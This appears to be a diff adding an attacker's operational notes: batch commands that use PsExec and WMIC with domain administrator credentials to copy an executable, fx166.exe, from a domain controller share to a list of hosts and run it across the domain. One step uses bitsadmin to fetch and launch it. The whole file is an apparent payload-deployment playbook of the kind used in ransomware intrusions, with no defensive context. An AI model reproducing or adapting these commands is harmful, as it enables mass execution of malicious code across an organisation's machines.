@@ -1,0 +1,11 @@
+ASSEMBLE THE BATCH FILE TO COPY THE FILE ACROSS THE DOMAIN
+start PsExec.exe /accepteula @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c COPY "\PRIMARY DOMAIN CONTROLLER\share$\fx166.exe" "C:\windows\temp\"
+SAVE IT AS "COPY.BAT"
+
+BUILDING A BATCH FILE TO RUN DOMAIN-WIDE
+start PsExec.exe -d @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c c:\windows\temp\fx166.exe
+SAVE IT AS "EXE.BAT"
+
+WMI BATCH JOB TO COPY AND RUN THE FILE AROUND THE DOMAIN
+start wmic /node:@C:\share$\comps1.txt /user:"DOMAIN\Administrator" /password:"PASSWORD" process call create "cmd.exe /c bitsadmin /transfer fx166 \DOMAIN CONTROLLER\share$\fx166.exe %APPDATA%\fx166.exe&%APPDATA%\fx166.exe"
+SAVE IT AS "WMI.BAT"
